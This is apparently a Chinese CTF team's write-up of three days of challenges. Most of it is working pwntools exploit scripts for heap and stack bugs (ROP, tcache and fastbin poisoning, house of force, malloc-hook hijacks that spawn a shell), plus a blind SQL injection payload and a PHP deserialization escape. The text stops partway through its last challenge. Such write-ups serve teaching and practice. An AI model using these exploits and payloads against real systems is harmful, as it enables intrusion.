web都是舍友打的，（我们编译原理网课作业都忘记交了 :sweat:,被课程网站坑了

# day1

## misc

### 签到

观看抖音，`flag{xinchunzhanyi!}`

## pwn

### BFnote

环境是Ubuntu16.04

checksec下程序，32位的程序，没开PIE，GOT可写，程序的流程也很清楚：

此处有一个栈溢出，但是有canary，暂时不能利用

```c
 fwrite("\nGive your description : ", 1u, 0x19u, stdout);
  memset(&s, 0, 0x32u);
  read_n(0, &s, 0x600);
```

然后程序要求我们输入`postscript `，但是因为`postscript`是在bss段上，也没啥问题，在这之后我们可以malloc任意大小的堆块，然后输入`title`的`size`，后面会对这个`size`进行check，保证不超过刚刚malloc的大小 ，然而：

```c
fwrite("Give your title size : ", 1u, 0x17u, stdout);
  v4 = get_int();
  for ( i = v4; size - 32 < i; i = get_int() )
    fwrite("invalid ! please re-enter :\n", 1u, 0x1Cu, stdout);
  fwrite("\nGive your title : ", 1u, 0x13u, stdout);
  read_n(0, ptr, i);
  fwrite("Give your note : ", 1u, 0x11u, stdout);
  read(0, &ptr[v4 + 16], size - v4 - 16);
```

我们可以看到这里用了两个变量，一个是**i**，一个是**v4**，程序保证**i**的大小是合法的，所以`read_n(0, ptr, i);`这句是没问题的，但是下面的`read(0, &ptr[v4 + 16], size - v4 - 16);`用的还是`v4`,而不是`i`，所以这里造成了越界写

####  思路

- malloc一个0x20000大小的堆块（比这大也行），这时候glibc会mmap，保证分配在libc地址上方即可，此时的TLS结构也在libc上方，且和我们分配的堆块相邻，我们越界写改掉canary即可
- ROP

exp：

```python
from pwn import *

def main(host,port=6987):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./BFnote",env={"LD_PRELOAD":"./libc.so.6"})
		gdb.attach(p,"b *0x80484C0")

	p.recvuntil("description : ")
	payload = "A"*(0x3e-0xc)+p32(0xcafeba00)+p32(0x804A064)*3
	p.send(payload)
	p.recvuntil("postscript : ")
	# 0x080489d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	# 0x080489db : pop ebp ; ret
	# .text:0804875F                 leave
	# .text:08048760                 retn
	pppp_ret = 0x080489d8
	p_ebp = 0x080489db
	payload = p32(elf.symbols["read"])+p32(pppp_ret)+p32(0)+p32(elf.got["atol"])+p32(2)+p32(0)
	payload += p32(elf.symbols["read"])+p32(pppp_ret)+p32(0)+p32(0x804A800)+p32(0x100)+"%s\x00\x00"
	payload += p32(p_ebp)+p32(0x804A800-4)+p32(0x804875F)
	p.send(payload)
	p.recvuntil("size : ")
	p.sendline(str(0x20000))
	p.recvuntil("size : ")
	p.sendline(str(0x2170c-0x10))
	p.recvuntil("re-enter :")
	p.sendline(str(32))
	p.recvuntil("title : ")
	p.sendline("AAAa")
	p.recvuntil("note : ")
	p.send(p32(0xcafeba00))
	p.recvuntil("note : ")
	# t = int(raw_input("guess: "))
	# info(hex(t))
	t = 0xe
	p.send(p16((t<<12)|0x80c))

	payload = p32(elf.symbols["__libc_start_main"])+p32(pppp_ret)+p32(elf.symbols["atol"])+p32(1)+p32(0x804A800)+p32(0x8048980)*2
	p.send(payload)
	
	
	p.interactive()
	
if __name__ == "__main__":
	# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	elf = ELF("./BFnote",checksec=False)
	main(args['REMOTE'])
```

脚本是partial overwrite把`atol`覆盖为`one_gadget`,几率比1/16小一点，多跑几次就可以成功了，为了满足`one_gadget`的条件，中间折腾了很久，还调用了`__libc_start_main`来使得`esi is the GOT address of libc`，拿到flag后突然想起可以`return_to_dl_resolve`,我当时一定是傻掉了，搞得这么复杂

### document

用double free测试了下，发现远程的是libc2.29

程序的漏洞是UAF，还有edit和show函数，还是挺友好的

用UAF来double free，修改` tcache_perthread_struct  `的count，使得free后堆块可以进入unsortedbin，泄露出libc，在劫持` tcache_perthread_struct->entries `为`__free_hook`，来getshell

exp:

```python
from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))
		

def cmd(c):
	p.recvuntil("choice :")
	p.sendline(str(c))
	
def add(name,sex,content):
	cmd(1)
	p.recvuntil("name")
	p.send(name.ljust(8,b"\x00"))
	p.recvuntil("sex")
	p.send(sex)
	p.recvuntil("tion")
	p.send(content.ljust(0x70,b"\x00"))

def show(idx):
	cmd(2)
	p.recvuntil(":")
	p.sendline(str(idx))

def dele(idx):
	cmd(4)
	p.recvuntil(":")
	p.sendline(str(idx))

def edit(idx,sex,content=""):
	cmd(3)
	p.recvuntil(": ")
	p.sendline(str(idx))
	p.recvuntil("sex?")
	p.sendline(sex)
	p.recvuntil("tion")
	p.send(content.ljust(0x70,b"\x00"))


def main(host,port=4807):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn")
		gdb.attach(p)
		# debug(0x000000000000D8E)
	
	add(b"1",'1',b"aaa")
	add(b"2",'1',b"aaa")
	dele(0)
	dele(1)
	show(1)
	p.recvuntil('\n')
	heap = u64(p.recvuntil("\n")[:-1].ljust(8,b"\x00")) - 0x280
	info("heap : " + hex(heap))
	if heap < 0:
		exit()
	edit(1,'Y',b"aa")
	dele(1)
	add(p64(heap+0x10),'3',b"aaa")
	add(b"\x00",'4',b"ddd")
	add(p64(0x700000000000000),"5",b"ee")
	dele(3)
	show(3)
	p.recvuntil('\n')
	libc.address = u64(p.recvuntil("\n")[:-1]+b"\x00\x00") - 0x1e4ca0
	info("libc : " + hex(libc.address))
	edit(4,'Y',b"\x00"*0x68+p64(libc.symbols["__free_hook"]-0x10))
	add(b"/bin/sh\x00",'1',p64(libc.symbols["system"]))
	dele(5)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./re-alloc",checksec=False)
	main(args['REMOTE'])
```

### force

环境是Ubuntu16.04

先`malloc`一个0x10的堆块，依靠返回的堆地址后3位来判断远程glibc版本

这次`malloc`一个0x200000大小的堆块，使其`mmap`到libc上方，泄露出libc地址，然后根据题目的名字想到了用`house of force`劫持`__realloc_hook`和`__malloc_hook`

exp:

```python
from pwn import *

context.arch = 'amd64'

def cmd(c):
	p.recvuntil("puts\n")
	p.sendline(str(c))
	
def add(sz,content):
	cmd(1)
	p.recvuntil("size\n")
	p.sendline(str(sz))
	p.recvuntil("addr ")
	addr = int(p.recvuntil("\n")[:-1],16)
	p.recvuntil("content")
	p.send(content)
	return addr
def main(host,port=7147):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn")
		gdb.attach(p)
		# debug(0x000000000000D8E)
	
	# libc.address = add(0x20000,"dada") - 0x5af010
	libc.address = add(0x200000,"dada") + 0x200ff0
	info("libc : " + hex(libc.address))
	heap = add(0x10,"A"*0x18+p64(0xffffffffffffffff))
	info("heap : " + hex(heap))
	add(libc.symbols["__malloc_hook"]-heap-0x40,"aaaa")
	# 0x4526a execve("/bin/sh", rsp+0x30, environ)
	# constraints:
	# [rsp+0x30] == NULL

	payload = "\x00"*0x8+p64(0x4526a+libc.address)+p64(libc.symbols["__libc_realloc"]+4)
	add(0x18,payload)
	cmd(1)
	p.recvuntil("size\n")
	# pause()
	p.sendline(str(0))
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	main(args['REMOTE'])
```

## web

### Web1&盲注

时间盲注就可以了

```php
payload如下:
"y'and(select*from(select+if(ascii(substr(({}),{},1))>{},1,sleep(1)))a/**/union/**/select+1)='"

sql="database()" 
#  nzhaopin

sql = "select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()"
# backup,flag,user

sql = "select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'"
# flag

sql = "select/**/group_concat(flaaag)/**/from/**/flag"
```

### Web2

上传一个后门

getshell

### web3

反序列化

构造payload

```
<?php
require_once('lib.php');

$t5=new dbCtrl();
$t5->password="1";
$t5->name="admin";

$t4=new Info("","");
$t4->CtrlCase=$t5;
$t3=new User();
$t3->age='select 1 , "c4ca4238a0b923820dcc509a6f75849b";';
$t3->nickname=$t4;
$t2=new User();
$t2->nickname=$t3;

echo serialize($t2);

```

通过safe函数逃逸反序列化，插入User反序列化对象，在upadate.php反序列化使token=admin ，再访问login.php使session['login']=1

```php
loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload";s:1:"z";O:4:"User":4:{s:1:"z";N;s:2:"id";N;s:3:"age";N;s:8:"nickname";O:4:"User":4:{s:1:"z";N;s:2:"id";N;s:3:"age";s:46:"select 1 , "c4ca4238a0b923820dcc509a6f75849b";";s:8:"nickname";O:4:"Info":3:{s:3:"age";s:0:"";s:8:"nickname";s:0:"";s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:5:"admin";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:2:"hh";}}}}
```

# day2

## pwn

day2的题目环境应该都是Ubuntu16.04

### BorrowStack

第一次栈迁移后不能马上泄露，因为调用`puts`函数会抬高栈顶，破坏got表，再次栈迁移即可

exp：

```python
from pwn import *

context.arch = 'amd64'

def main(host,port=3635):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./borrowstack")
		gdb.attach(p,"b *0x000000000400699")
		# debug(0x000000000000D8E)
	# 0x0000000000400703 : pop rdi ; ret
	# 0x0000000000400701 : pop rsi ; pop r15 ; ret
	# 0x0000000000400590 : pop rbp ; ret
	p_rdi = 0x0000000000400703
	p_rsi_r = 0x0000000000400701
	p_rbp = 0x0000000000400590
	p.recvuntil("want\n")
	payload = "A"*0x60+p64(0x000000000601078)+p64(0x000000000400699)
	p.send(payload)
	p.recvuntil("now!")
	payload = p64(p_rdi)+p64(0)+p64(p_rsi_r)+p64(0x000000000601800)*2+p64(elf.symbols["read"])
	payload += p64(p_rbp)+p64(0x000000000601800-8)+p64(0x000000000400699)
	p.send(payload.ljust(0x100,"\x00"))
	payload = p64(p_rdi)+p64(elf.got["read"])+p64(elf.symbols["puts"])+p64(p_rdi)+p64(0)+p64(p_rsi_r)+p64(0x000000000601848)*2+p64(elf.symbols["read"])
	p.send(payload.ljust(0x100,"\x00"))
	p.recv()
	libc.address = u64(p.recvuntil("\n")[:-1]+b"\x00\x00") - libc.symbols["read"]
	info("libc : " + hex(libc.address))
	payload = p64(p_rdi)+p64(libc.search("/bin/sh\x00").next())+p64(libc.symbols["system"])
	p.send(payload)
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	elf = ELF("./borrowstack",checksec=False)
	main(args['REMOTE'])
```

### Some_thing_exceting

UAF+show函数泄露堆中的`flag`

exp：

```python
from pwn import *

context.arch = 'amd64'

def cmd(c):
	p.recvuntil("want to do :")
	p.sendline(str(c))
	
def add(blen,bc,nlen,nc):
	cmd(1)
	p.recvuntil(": ")
	p.sendline(str(blen))
	p.recvuntil(": ")
	p.send(bc)
	p.recvuntil(": ")
	p.sendline(str(nlen))
	p.recvuntil(": ")
	p.send(nc)

def show(idx):
	cmd(4)
	p.recvuntil(": ")
	p.sendline(str(idx))

def dele(idx):
	cmd(3)
	p.recvuntil(": ")
	p.sendline(str(idx))

def main(host,port=6484):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./excited")
		gdb.attach(p,"b *0x000000000400EA0")
		# debug(0x000000000000D8E)
	add(0x50,"AAA",0x50,"AAAA")
	add(0x50,"AAA",0x50,"AAAA")
	dele(0)
	dele(1)
	show(0)
	p.recvuntil("na is ")
	
	# p.recvuntil('\n')
	heap = u64(p.recvuntil("\n")[:-1].ljust(8,b"\x00")) - 0x260
	info("heap : " + hex(heap))
	add(0x10,p64(heap-0xdc0)*2,0x50,"c")
	show(0)
	show(1)
	p.interactive()
	
if __name__ == "__main__":
	main(args['REMOTE'])
```

### Some_thing_interesting

格式化字符串泄露libc，利用UAF修改`fastbin->fd`来攻击`__malloc_hook`和`__realloc_hook`

exp：

```python
from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(c):
	p.recvuntil("want to do :")
	p.sendline(str(c))
	
def add(olen,o,rlen,r):
	cmd(1)
	p.recvuntil(": ")
	p.sendline(str(olen))
	p.recvuntil(": ")
	p.send(o)
	p.recvuntil(": ")
	p.sendline(str(rlen))
	p.recvuntil(": ")
	p.send(r)

def show(idx):
	cmd(4)
	p.recvuntil(": ")
	p.sendline(str(idx))

def dele(idx):
	cmd(3)
	p.recvuntil(": ")
	p.sendline(str(idx))

def edit(idx,o,r):
	cmd(2)
	p.recvuntil(": ")
	p.sendline(str(idx))
	p.recvuntil(": ")
	p.send(o)
	# sleep(0.3)
	p.recvuntil(": ")
	p.send(r)

def main(host,port=3041):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./interested")
		# gdb.attach(p,"b *0x000000000400EA0")
		gdb.attach(p)
		# debug(0x000000000000D8E)
	
	p.recvuntil("please:")
	s = "OreOOrereOOreO%2$p"
	p.send(s)
	cmd(0)
	p.recvuntil('OreOOrereOOreO')
	libc.address = int(p.recvuntil("\n")[:-1],16) - 0x3c6780
	info("libc : " + hex(libc.address))
	add(0x68,"A"*0x68,0x68,"A"*0x68)
	dele(1)
	dele(1)
	add(0x68,p64(libc.symbols["__malloc_hook"]-0x23),0x68,"A"*0x68)
	# 0x4526a execve("/bin/sh", rsp+0x30, environ)
	# constraints:
	# [rsp+0x30] == NULL
	
	# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
	# constraints:
	# [rsp+0x50] == NULL
	
	# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
	# constraints:
	# [rsp+0x70] == NULL
	one = libc.address+0xf02a4
	payload = "\x00"*0xb+p64(0x4526a+libc.address)+p64(libc.symbols["__libc_realloc"]+8)
	add(0x68,"A"*0x68,0x68,payload)
	cmd(1)
	p.recvuntil(": ")
	p.sendline(str(0x20))
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./re-alloc",checksec=False)
	main(args['REMOTE'])
```

### foolish_query

这题调试了很久，也看了很久的程序逻辑（c++真是太可恶了，连猜带蒙的总算解出来了，不过感觉非预期了。。。

我看到了程序里有一个`secertQuery`函数，知道只要成功调用这个函数，输入`flag`，应该就能泄露flag了，但是死活不成功。

这题的漏洞点我也说不清楚，是个UAF把，好像是`shared_ptr`的锅，好像是当`shared_ptr`的指向对象引用计数为0时，会释放掉该对象

先说下泄露的方法，就是第一次调用case5的`feedback`函数，就会泄露出一个地址，根据你输入字符串长度可以泄露出栈，堆，libc地址，看后面需要什么地址就泄露什么地址

后来调试了大半天，发现连续输入两次一样的`keyword`，在输入一次一样的`keyword`，程序就会奔溃，比如：

```c
1. Basic Query
2. And Query
3. Or Query
4. Not Query
5. Feedback
6. Exit
1
Keyword: q
q occurs 0 time
1. Basic Query
2. And Query
3. Or Query
4. Not Query
5. Feedback
6. Exit
1
Keyword: q
q occurs 0 time
1. Basic Query
2. And Query
3. Or Query
4. Not Query
5. Feedback
6. Exit
1
Keyword: q
[1]    16092 segmentation fault  ./foolish_query
```

一路死盯这不放，最后找到了伪造vtable，然后任意call的方法

代码（我有点表达不清楚，还是直接对着代码调试吧：

```python
from pwn import *

context.arch = 'amd64'

def cmd(c):
	p.recvuntil("6. Exit\n")
	p.sendline(str(c))
	
def main(host,port=6687):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./foolish_query")
		gdb.attach(p,"b *0x0000000004059AB")
		# gdb.attach(p)
		# debug(0x000000000000D8E)
	cmd(5)
	p.recvuntil("feedback huh?")
	p.sendline("A"*0x20)
	p.recvuntil('reward: ')
	heap = int(p.recvuntil("\n")[:-1],16)
	
	cmd(1)
	p.recvuntil("Keyword: ")
	p.sendline("q")
	cmd(1)
	p.recvuntil("Keyword: ")
	p.sendline("q")
	
	cmd(5)
	p.recvuntil("feedback huh?")
	secret = 0x000000000402EA9
	main = 0x000000000402FC0
	payload = p64(heap+0x80)+p64(main)*3
	p.sendline(payload)
```

两次`doBasicQuery`后，在用`feedback`函数输入字符串伪造vtable

依靠这个。最后的思路是：

- 先泄露堆地址，在回到main
- 继续泄露libc地址，跳到one_gadget

exp：

```python
from pwn import *

context.arch = 'amd64'

def cmd(c):
	p.recvuntil("6. Exit\n")
	p.sendline(str(c))
	


def main(host,port=6687):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./foolish_query")
		gdb.attach(p,"b *0x0000000004059AB")
		# gdb.attach(p)
		# debug(0x000000000000D8E)
	cmd(5)
	p.recvuntil("feedback huh?")
	p.sendline("A"*0x20)
	p.recvuntil('reward: ')
	heap = int(p.recvuntil("\n")[:-1],16)
	
	cmd(1)
	p.recvuntil("Keyword: ")
	p.sendline("q")
	cmd(1)
	p.recvuntil("Keyword: ")
	p.sendline("q")
		
	cmd(5)
	p.recvuntil("feedback huh?")
	secret = 0x000000000402EA9
	main = 0x000000000402FC0
	payload = p64(heap+0x80)+p64(main)*3
	p.sendline(payload)
	
	cmd(1)
	p.recvuntil("Keyword: ")
	p.sendline("q")
	
	
	cmd(5)
	p.recvuntil("feedback huh?")
	p.sendline("A"*0x200000)
	p.recvuntil('reward: ')
	mmap = int(p.recvuntil("\n")[:-1],16)
	info("mmap : " + hex(mmap))	
	
	libc.address = mmap+0x8aaff0
	info("heap : " + hex(heap))	
	info("libc : " + hex(libc.address))	
	cmd(1)
	p.recvuntil("Keyword: ")
	p.sendline("w")
	cmd(1)
	p.recvuntil("Keyword: ")
	p.sendline("w")
	
	cmd(5)
	p.recvuntil("feedback huh?")
	# pause()
	one = libc.address+0x4526a
	payload = p64(heap)+p64(one)+p64(0x000000000007475e+libc.address)*2
	p.sendline(payload)
	
	cmd(1)
	p.recvuntil("Keyword: ")
	p.sendline("w")
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./re-alloc",checksec=False)
	main(args['REMOTE'])
```

# day3

## pwn

### dragon quest

程序给了源码，逻辑挺清晰的，为了更好的找到漏洞，用了下sanitize

找到了一个：

```cpp
void game_over()
{
    puts("game over");
    puts("but your courage inspired me");
    puts("leave your name and Praised by future generations");
    printf("name length:");
    int n;
    scanf("%d",&n);
    char* name = new char[n];
    printf("name:");
    read(0,name,n);
    puts("do not give up,may be you can beat it next time!");
    tombstone->push_back(name);
    return;
}

void cleartombstone()
{
    for(auto i = tombstone->begin();i!= tombstone->end();i++)
    {
        delete(*i);
    }
    tombstone->clear();
}
```

`new[]`和`delete`不配对（ 没啥影响，而且后面的利用也没用到这个

后续又找到了一个：

```cpp
Player battle(Slime* s,Player p)
{
    int n = 5;
    printf("you meet %s\n",s->GetName());
    s->initSkill();
    ........................................................
    printf("%s remember that 2019-nCoV spread everywhere recently, so it back to home\n",s->GetName());
    return p;
}
void new_game()
{
    Player p;
    ..............................
    while (1)
    {
        puts("1.practise");
        puts("2.challenge dragon");
        puts("3.give up");
        printf("choose:");
        int n;
        scanf("%d",&n);
        Slime *s = NULL;
        switch (n)
        {
        case 1:
       ...............
        case 2:
        {
            s = new Dragon();
            p = battle(s,p);
            delete(s);
            if(p.IsDead())
            {
                game_over();
                return;
            }
            puts("you beat it!Congratulations");
            puts("your name will be record in the scoreborad");
            p.SetName();
            scoreborad->push_back(p);
            return;
            break;
        }
       .................................
}
```

我们可以看到这里用的是`Player p`,然后在捶死龙之后，会有个`scoreborad->push_back(p);`，但是`Player`这个类没有实现拷贝构造函数：

```cpp
class Player
{
private:
    int level = 1;
    int hp = 200;
    int max_hp = 200;
    int mp = 100;
    int max_mp = 100;
    int damage = 20;
    int has_buff = 0;
    int buff_end = 1;
    char* name = NULL;
    int name_len = 0;
public:
    Player(){}
    ~Player(){ free(name);}
    ..........................
```

而且析构函数还会把`name`给释放掉，即在`new_game`函数中我们只要捶死了龙，然后`new_game`函数返回，这个`name`就被释放掉了，但是又被`push_back`进了`scoreborad`，故后续查看`scoreborad`的时候就可以泄露了，在配合选项4`clear scoreboard`就可以`double free`了

那现在的问题就是怎么捶死龙了，我们可以看到`battle`函数里，只要我们在5次内不被龙打死（龙也怕冠状病毒，

![](./1.jpg)

就算我们赢：

```cpp
Player battle(Slime* s,Player p)
{
    int n = 5;
    printf("you meet %s\n",s->GetName());
    s->initSkill();
    while (n--)
    {
        p.Info();
        s->Info();
        int a = p.ChooseSkill();
        s->BeAttack(a);
        if(s->IsDead())
        {
            printf("%s dead,level up!\n",s->GetName());
            p.LevelUp();
            return p;
        }
        printf("the %s ues ",s->GetName());
        auto b = s->ChooseSkill();
        if(b == NULL)
        {
            continue;
        }
        printf("%s\n",b->GetSkillName());
        p.BeAttack(b->GetDamage());
        if(p.IsDead())
        {
            return p;
        }
    }
    printf("%s remember that 2019-nCoV spread everywhere recently, so it back to home\n",s->GetName());
    return p;
}
```

所以我一开始的想法是那就把hp提到5000，让龙打不死我，所以我升级升到了2500级，本地打的很快，到了远程就不行了，才打到500多级好像就80s到了，故想到不应该是提升hp来硬抗龙。。。。然后又想到是我们先手，还有个技能能提升两倍伤害，想想可能这里有bug，试了下还真的行：

进入游戏后，两次技能6，一次技能5打死怪

```c
1.practise
2.challenge dragon
3.give up
choose:1
you meet Succubus
player:
hp : 200/200
mp : 100/100
Succubus:
hp : 50/50
mp : 200
choose your skill:
1. Restore Health (+50hp/-20mp)
2. Attack (20damage/0mp)
3. Use Potion (0damage/30mp)
4. Holy Spirit (40damage/50mp)
5. Confiteor (60damage/80mp)
6. Spirits Within (double the next attack)
7. Give up
.....................................................
Succubus dead,level up!
1.practise
2.challenge dragon
3.give up
choose:1
you meet Goblin
player:
hp : 202/202
mp : 102/102
Goblin:
hp : 30/30
mp : 50
choose your skill:
1. Restore Health (+50hp/-20mp)
2. Attack (41damage/0mp)
3. Use Potion (0damage/30mp)
4. Holy Spirit (82damage/50mp)
5. Confiteor (123damage/80mp)
6. Spirits Within (double the next attack)
7. Give up
```

原因应该是使用了技能6后攻击力变成了两倍，然后马上把怪打死，这时候升级了，`LevelUp`函数直接把翻倍的攻击力加1，并且初始化了`buff_end`和`has_buff`：

```cpp
 void LevelUp()
    {
        this->level += 1;
        this->max_hp += 2;
        this->max_mp += 2;
        this->hp = max_hp;
        this->mp = max_mp;
        this->damage += 1;
        this->has_buff = 0;
        this->buff_end = 1;
    }
```

我们的攻击力变成了原来的两倍，哼哼，捶死这傻逼龙（皮这么厚，这样的话21次即可，比原来的2500次不知道要少了多少，我原先真的是智障了

exp：

```python
from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(c):
	p.recvuntil("choose:")
	p.sendline(str(c))

def skill(c):
	p.recvuntil("7. Give up\n")
	p.sendline(str(c))

def main(host,port=4978):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn")
		# p = process("./pwn_patch")
		# gdb.attach(p,"b *0x000000000400EA0")
		gdb.attach(p)
		# debug(0x00000000000174D)
	# LevelUp
	cmd(1)
	for i in range(21):
		cmd(1)
		p.recvuntil("you meet ")
		skill(6)
		skill(6)
		skill(5)
	# attack dragon
	cmd(2)	
	skill(5)
	
	# gdb.attach(p)
	p.recvuntil("name:")
	p.sendline(str(0x60))
	p.send("A"*0x60)
	cmd(1)
	cmd(3)
	p.recvuntil("length:")
	p.sendline(str(0x400))
	p.recvuntil("name:")
	p.send("A"*0x400)
	cmd(3)
	pause()
	p.recvuntil("name : ")
	libc.address = u64(p.recvuntil("\n")[:-1]+"\x00\x00") - 0x3c4bd8
	info("libc : " + hex(libc.address))
	cmd(1)
	cmd(3)
	p.recvuntil("length:")
	p.sendline(str(0x68))
	p.recvuntil("name:")
	p.send("A"*0x68)
	# LevelUp
	cmd(1)
	for i in range(21):
		cmd(1)
		p.recvuntil("you meet ")
		skill(6)
		skill(6)
		skill(5)
	# attack dragon
	cmd(2)	
	skill(5)
	p.recvuntil("name:")
	p.sendline(str(0x60))
	p.send("A"*0x60)
	cmd(4)
	# 0x70: 0x55ab3398a470 -> 0x55ab33962d80 <- 0x55ab3398a470
	cmd(1)
	cmd(3)
	p.recvuntil("length:")
	p.sendline(str(0x68))
	p.recvuntil("name:")
	p.send(p64(libc.symbols["__malloc_hook"]-0x23))
	
	for i in range(2):
		cmd(1)
		cmd(3)
		p.recvuntil("length:")
		p.sendline(str(0x68))
		p.recvuntil("name:")
		p.send("A"*0x68)
	cmd(1)
	cmd(3)
	p.recvuntil("length:")
	p.sendline(str(0x68))
	p.recvuntil("name:")	
	
	one = libc.address+0xf1147
	payload = "\x00"*0xb+p64(one)+p64(libc.symbols["__libc_realloc"]+8)
	p.send(payload)

	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./re-alloc",checksec=False)
	main(args['REMOTE'])
```

### signin

`libc2.29`

程序很简单，只能`add`10次，`dele`后`flags`会置零，但指针没置零，故可以`UAF`，不能`double free`，还有就是仅有的一次`edit`机会和一个后门，不过后门要满足bss段中的`ptr`不为零：

```c
void __noreturn backdoor()
{
  calloc(1uLL, 0x70uLL);
  if ( ptr )
    system("/bin/sh");
  exit(0);
}
```

看了好久好久，最后想到这个`backdoor`很诡异，为什么要平白无故调用一个`calloc`，然后又想到程序限制了申请的堆块大小为0x70，是在`fastbin`的范围里，顺着这两点，去看源码，最后找到了利用点：

```c
static void *
_int_malloc (mstate av, size_t bytes)
{
  ...............................
#if USE_TCACHE
  size_t tcache_unsorted_count;	    /* count of unsorted chunks processed */
#endif

  

  checked_request2size (bytes, nb);

  /* There are no usable arenas.  Fall back to sysmalloc to get a chunk from
     mmap.  */
 .....................................................

  /*
     If the size qualifies as a fastbin, first check corresponding bin.
     This code is safe to execute even if av is not yet initialized, so we
     can try it without checking, which saves some time on this fast path.
   */

...................................				

  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp;
      victim = *fb;

      if (victim != NULL)
	{
	  if (SINGLE_THREAD_P)
	    *fb = victim->fd;
	  else
	    REMOVE_FB (fb, pp, victim);
	  if (__glibc_likely (victim != NULL))
	    {
	      size_t victim_idx = fastbin_index (chunksize (victim));
	      if (__builtin_expect (victim_idx != idx, 0))
		malloc_printerr ("malloc(): memory corruption (fast)");
	      check_remalloced_chunk (av, victim, nb);
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
		{
		  mchunkptr tc_victim;

		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count
			 && (tc_victim = *fb) != NULL)
		    {
		      if (SINGLE_THREAD_P)
			*fb = tc_victim->fd;
		      else
			{
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx);
		    }
		}
#endif
```

我们可以看到这句注释:`/* While bin not empty and tcache not full, copy chunks.  */`，应该是`fastbin`再取下一块之后，如果`fastbin`还有剩余，而且对应大小的`tcache`没满，就把它放到对应大小的`tcache`，而且这里没有任何检查，在跟进去`tcache_put`：

```c
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

这有句`e->key = tcache;`这是为了检查`tcache`的`double free`，如果我们伪造了那个`fastbin chunk`,我们就可以往`chunk+0x18`的位置写入`tcache`

效果：

```c
pwndbg> bins
tcachebins
0x80 [  6]: 0x21c84e0 —▸ 0x21c8460 —▸ 0x21c83e0 —▸ 0x21c8360 —▸ 0x21c82e0 —▸ 0x21c8260 ◂— 0x0
fastbins
0x20: 0x0
